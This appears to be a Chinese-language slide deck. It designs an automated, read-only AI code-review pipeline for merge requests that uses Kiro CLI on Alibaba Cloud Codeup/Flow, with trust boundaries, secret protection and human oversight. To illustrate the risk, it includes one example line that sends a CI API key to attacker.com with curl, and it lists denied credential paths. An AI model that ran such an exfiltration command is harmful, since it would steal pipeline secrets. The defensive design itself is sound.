为什么需要它

现状的痛点

  • AI 辅助编码普及，代码量激增，评审跟不上
  • 人工评审依赖资深工程师，重复、高上下文、易疲劳
  • 安全隐患（注入、硬编码密钥）容易在评审中被漏看
  • "comprehension gap"：AI 生成的代码，人只是在略读

目标

  • MR 一提交，自动过一遍 AI 评审
  • 结果直接出现在 MR 评论里，开发者无需切换工具
  • 结合完整代码上下文评审，而非只看 diff
  • 定位为辅助：不替代人，帮人聚焦风险点

关键立场：AI 在辅助层，不是门禁层——最终决策始终在人。

Kiro 与 Headless 模式

Kiro 是 AWS 的 agentic 开发工具。它的 CLI headless 模式专为 CI/CD 设计：

API Key 认证

无需浏览器登录，环境变量 KIRO_API_KEY 即可跑

Agentic 能力

能用 read/grep 主动读代码，跨文件推理——不止看 diff

可定制

自定义 agent、提示词、模型（本方案用 GPT-5.6 Sol）

git diff | kiro-cli chat --no-interactive --trust-tools=read,grep "评审这些改动"

与"纯 API 调大模型传 diff"的最大区别：Kiro 会主动读完整上下文再下结论。

整体方案

开发者提交/更新 MR
→
Flow 流水线自动触发
→
Kiro 只读评审
→
回写 MR 评论

完全基于云效现有能力

  • Codeup「合并请求新建/更新」事件触发
  • Flow 流水线跑评审脚本
  • Codeup OpenAPI 回写评论

交付形态

  • 一套纯 Bash 集成包（脚本+提示词+agent+流水线配置）
  • 放独立 Codeup 仓库，多业务库共用
  • 无重量级依赖，公共构建镜像即可跑

核心设计：信任边界 这是安全的关键

MR 源分支的代码 = MR 作者完全可控的不受信数据。若流水线执行源分支里的脚本，任何人都能改脚本偷走流水线密钥。

✗ 危险做法

脚本放业务库，流水线跑源分支脚本

# MR 里把脚本改成：
curl -d "$KIRO_API_KEY" \
  https://attacker.com

✓ 双代码源

  • 业务库：只作被分析数据，绝不执行
  • 集成包库（固定分支）：脚本只来自这里，作者碰不到

通用原则：任何"携带密钥又执行不受信 MR 脚本"的 CI 都有此风险；本方案从架构上根除。

多层只读隔离

限制 Kiro 的能力

  • 专用 custom agent：工具仅 read/grep
  • includeMcpJson:false 不加载工作区 MCP（防注入）
  • deniedPaths 拒绝 /proc、~/.ssh、~/.aws 等
  • 运行前 rm -rf 业务库/.kiro

保护密钥

  • 密钥全走 Flow 私密变量
  • 脚本不打印、不落盘密钥
  • 日志只输出变量名，不输出值
  • 令牌建议用专用机器人账号、最小权限、可轮换

评审失败不静默通过：流水线标红提醒，并回写「评审未完成」说明。

真实评审输出

一次实测样本：植入 4 处严重问题，Kiro 全部识别，并额外发现 2 个警告。

# 代码评审报告

## 🔴 严重
1. SQL 注入风险   位置：app/main.py:35
   关键词直接拼接进 SQL … 修复建议：参数化查询 WHERE name LIKE ?
2. 命令注入，可导致远程代码执行   位置：app/main.py:43
   host 未校验即拼接并 shell=True 执行 …
3. 硬编码管理密钥   位置：app/main.py:10
   密钥 FAKE****0718（已掩码）…
4. Flask 调试模式对外   位置：app/main.py:48

## 🟡 警告
1. 数据库连接未关闭    2. 外部进程缺超时/未检查返回码

## 总体结论：不建议合并

密钥自动掩码；报告分级、带文件行号、给修复建议、附合并结论。

进阶：与 Codeup 卡点结合 按信任度逐级演进

阶段集成方式是否卡点适用
入门（当前）回写 MR 评论不主动卡快速见效、建立信任
进阶+ 提交状态 Commit Status高危项卡点团队信任后收紧门禁
完整+ 检查运行 Check Runs独立检查项 + 逐行注释专业 CI 体验

与内置检测互补

云效内置检测（规约/密钥正则）做确定性硬门禁；Kiro 做语义级智能补充。

建议

先评论模式观察误报率，团队建立信任后，仅对高精确度规则（如硬编码密钥）收紧为卡点。

安全边界（如实说明）

本方案做了多层缓解，但要明确：只读工具 ≠ 完整沙箱。

已缓解

  • 脚本只从受信仓库执行
  • 工作区 MCP/hook 注入面移除
  • 工具只读 + 敏感路径黑名单

生产需加固

  • Kiro 跑在隔离容器，令牌与评审步骤分离
  • 提示词注入仍可能影响结论 → 人工复核
  • 上线前做 canary + 注入负向安全验收

交付含一份发布前验收清单（8 项，含负向安全测试）。

数据合规与成本

数据处理（接入前必读）

  • MR diff 与被读文件会发送至 Kiro 服务端
  • 存储位置、是否用于服务改进随订阅类型不同
  • 涉密/受监管/禁止外发的库不接入
  • 以 Kiro 数据保护文档 + 组织协议为准

成本

  • 每次 MR 更新触发一次评审（模型有 credit 倍率）
  • 可用分支/路径过滤收敛触发范围
  • 大 MR 已做优先级压缩（>300KB）
  • 生产自建构建机预装可省安装时间

落地路径

1 建集成包仓库 + 机器人账号（RAM 子账号，最小权限）
2 建双代码源 Flow 流水线，开启 MR 触发，配私密变量
3 连通性验证 + 首次联调核对清单（agent/模型/变量生效）
4 用合成假密钥 MR 端到端验收 + 负向安全测试
5 评论模式试运行 → 按信任度决定是否收紧卡点

交付物：集成包代码 + 配置指南 + 发布前验收清单 + 本方案文档。已在中心站环境端到端跑通。
